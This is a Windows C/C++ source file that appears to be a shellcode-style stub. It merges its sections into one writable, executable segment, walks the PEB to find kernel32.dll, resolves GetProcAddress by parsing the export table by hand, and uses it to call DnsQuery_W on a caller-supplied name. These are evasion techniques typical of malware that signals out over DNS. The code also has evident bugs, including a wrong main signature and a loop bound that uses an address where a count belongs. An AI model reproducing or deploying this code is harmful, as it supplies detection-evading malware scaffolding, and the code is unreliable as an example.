
#include <windows.h>
#include <stdio.h>

#include "decl_func.h"

#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /MERGE:.pdata=.text")
#pragma section(".text",read,write,execute)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};

static char* _CharLowerA(char* str)
{
    int i = 0;
    while (str[i])
    {
        if ((str[i] >= 'A') && (str[i] <= 'Z'))
        {
            str[i] = str[i] + 0x20;
        }
        i++;
    }

    return str;
}

static char* unicode_name_transform_to_char(LDR_MODULE* mdll, char* name) {
    // TODO 64 is bad 
    for (size_t i = 0; (i < mdll->dllname.Length) && (i < 64); i++)
    {
        name[i] = (char)mdll->dllname.Buffer[i];
    }
    return _CharLowerA(name);
}

int cmpstr(const char* s1, const char* s2)
{
    while (*s1 && *s1 == *s2) ++s1, ++s2;
    return ((unsigned char)*s1 > (unsigned char)*s2) -
        ((unsigned char)*s1 < (unsigned char)*s2);
}

void cpystr(char* to, char* from)
{
    while (*from)
    {
        *to = *from;
        to++;
        from++;
    }
    *to = *from;
}

static HMODULE getKernel32_by_str() {
    HMODULE kernel32;
    INT_PTR peb = __readgsqword(0x60);
    auto modList = 0x18;
    auto modListFlink = 0x18;
    auto kernelBaseAddr = 0x10;

    auto mdllist = *(INT_PTR*)(peb + modList);
    auto mlink = *(INT_PTR*)(mdllist + modListFlink);
    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
    auto mdl = (LDR_MODULE*)mlink;
    do {
        mdl = (LDR_MODULE*)mdl->e[0].Flink;
        if (mdl->base != nullptr) {
            char name[64];
            if (!cmpstr("kernel32.dll", unicode_name_transform_to_char(mdl, name))) {
                break;
            }
        }
    } while (mlink != (INT_PTR)mdl);

    kernel32 = (HMODULE)mdl->base;
    return kernel32;
}

static LPVOID getAPIAddr_byStr(HMODULE module_address, char* name)
{
    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module_address;
    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module_address + img_dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY img_export_directory = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)module_address + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfNames);
    PWORD  fOrd = (PWORD)((LPBYTE)module_address + img_export_directory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_export_directory->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)module_address + fNames[i]);

        char tmpFuncName[MAX_PATH];
        cpystr(tmpFuncName, pFuncName);
        _CharLowerA(tmpFuncName);

        if (!cmpstr(name, tmpFuncName))
        {
            return (LPVOID)((LPBYTE)module_address + fAddr[fOrd[i]]);
        }

    }
    return nullptr;
}

#pragma comment(lib, "dnsapi.lib")

int main(wchar_t *dns_str) {

    HMODULE mod_kernel32 = getKernel32_by_str();
    fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr_byStr(mod_kernel32, "getprocaddress");

    fnLoadLibraryA myLoadLibrary = (fnLoadLibraryA)myGetProcAddress(mod_kernel32, "LoadLibraryA");

    HMODULE dnsLib = myLoadLibrary("DNSAPI.dll");
    fnDnsQuery_W myDnsQuery_W = (fnDnsQuery_W)myGetProcAddress(dnsLib, "DnsQuery_W");

    PDNS_RECORD dnsRecord;

    myDnsQuery_W(
        dns_str,
        DNS_TYPE_A,
        DNS_QUERY_STANDARD,
        NULL,
        &dnsRecord,
        NULL
    );

    return 0;
}